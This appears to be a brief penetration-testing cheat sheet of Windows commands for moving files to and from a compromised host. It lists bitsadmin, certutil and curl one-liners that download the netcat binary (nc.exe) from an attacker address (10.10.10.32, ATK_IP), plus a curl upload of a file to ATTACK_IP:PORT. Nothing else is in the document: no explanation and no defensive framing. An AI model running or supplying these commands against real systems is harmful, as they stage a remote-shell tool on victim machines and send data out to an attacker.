# CMD

### 1) Bitsadmin

    bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

### 2) certutil

    certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe

### 3) cURL

    curl -o C:\Users\USER\Downloads.nc.exe http://ATK_IP/nc.exe
    curl --upload-file test.txt http://ATTACK_IP:PORT/
